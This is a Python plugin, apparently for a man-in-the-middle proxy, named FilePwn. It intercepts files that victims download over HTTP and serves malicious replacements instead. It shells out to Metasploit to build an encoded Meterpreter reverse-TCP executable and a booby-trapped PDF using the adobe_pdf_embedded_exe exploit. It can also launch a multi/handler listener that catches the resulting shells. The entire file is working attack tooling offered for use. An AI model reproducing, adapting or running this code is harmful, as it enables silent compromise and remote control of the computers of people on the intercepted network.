import os,subprocess,logging,time
from plugins.plugin import Plugin
from plugins.StartMSF import launch_msf
exe_mimetypes = ['application/octet-stream', 'application/x-msdownload', 'application/exe', 'application/x-exe', 'application/dos-exe', 'vms/exe', 'application/x-winexe', 'application/msdos-windows', 'application/x-msdos-program']

class FilePwn(Plugin):
    name = "FilePwn"
    optname = "filepwn"
    implements = ["handleResponse"]
    has_opts = True
    log_level = logging.DEBUG
    desc = "Replace files being downloaded via HTTP with malicious versions. Currently only supports Windows MSF options."
    def initialize(self,options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options = options
        self.payloads = {}
        self._make_files()
        if options.launch_msf_listener:
            self._start_msf()
    def _start_msf(self):
        f = open("/tmp/file.rc","w")
        opts = [i.replace("="," ") for i in 
                    self.options.msf_file_payload_opts.split(" ")]
        f.write("use multi/handler\n")
        f.write("set PAYLOAD %s\n" % self.options.msf_file_payload)
        for opt in opts:
            f.write("set %s\n" % opt)
        f.write("set ExitOnSession false\nexploit -j\n")
        f.flush()
        msfc = os.path.join(self.options.msf_path,"msfconsole")
        launch_msf(msfc,f.name,self.options.msf_user)
        
        
    def _make_files(self):
        self.exe_made = False
        if self.options.exe:
            self._make_exe()
        if self.options.pdf:
            self._make_pdf()

    def _make_exe(self):
        if self.options.exe_file == None:
            logging.info("Generating our executable...")
            msfp = os.path.join(self.options.msf_path,"msfpayload") + " %s %s"
            msfe = os.path.join(self.options.msf_path,"msfencode") + " %s"
            payload = msfp%(self.options.msf_file_payload,self.options.msf_file_payload_opts)
            encode = msfe % "-t exe -o /tmp/tmp.exe -e x86/shikata_ga_nai -c 8"
            print payload+" R |"+encode
            os.system(payload+" R |"+encode)
            self.exe_made = True
            self.exe = "/tmp/tmp.exe"
        else:
            self.exe = self.options.exe_file
        self.exe_payload = open(self.exe,"rb").read()
        if self.options.exe:
            for m in exe_mimetypes:
                self.payloads[m] = self.exe_payload

    def _make_pdf(self):
        logging.info("Generating our PDF...")
        if self.options.pdf_exploit.find("embedded_exe") != -1:
            if not self.exe_made:
                self._make_exe()
            if self.options.msf_file_payload_opts.find("EXEFILE") == -1:
                self.options.msf_file_payload_opts += " EXEFILE=" + self.exe
        if self.options.msf_file_payload_opts.find("INFILENAME") == -1:
            self.options.msf_file_payload_opts += " INFILENAME=" + \
                                                  os.path.join(self.options.full_path,"data/blank.pdf")
        self.options.msf_file_payload_opts += " FILENAME=/tmp/tmp.pdf"
        msfc = os.path.join(self.options.msf_path,"msfcli") + " %s %s E"
        os.system(msfc % (self.options.pdf_exploit,self.options.msf_file_payload_opts))
        self.payloads['application/pdf'] = open("/tmp/tmp.pdf","rb").read()
    
    def handleResponse(self,request,data):
        print "http://" + request.client.getRequestHostname() + request.uri
        ch = request.client.headers['Content-Type']
        print ch
        if ch in self.payloads:
            data = self.payloads[ch]
            return {'request':request,'data':data}
        else:
            return

    def add_options(self,options):
        options.add_argument("--msf-file-payload",type=str,default="windows/meterpreter/reverse_tcp",
                help="Payload you want to use (default: windows/meterpreter/reverse_tcp)")
        options.add_argument("--msf-file-payload-opts",type=str,default="LHOST=127.0.0.1 LPORT=4444",
            help="Options for payload (default: \"LHOST=127.0.0.1 LPORT=4444\")")
        options.add_argument("--pdf",action="store_true",
                help="Intercept PDFs and replace with malicious.")
        options.add_argument("--exe",action="store_true",
                help="Intercept exe files and replace with malicious.")
        options.add_argument("--exe-file",type=str,
                help="Specify your own exe payload rather than generating with msf")
        options.add_argument("--launch-msf-listener",action="store_true",
                help="Launch a listener in a seperate shell.")
        #options.add_argument("--backdoor",action="store_true",
        #        help="Backdoor files rather than replace (SLOW)")
        options.add_argument("--pdf-exploit",type=str,
                default="exploit/windows/fileformat/adobe_pdf_embedded_exe",
                help="Exploit to use in PDF (default: exploit/windows/fileformat/adobe_pdf_embedded_exe)")
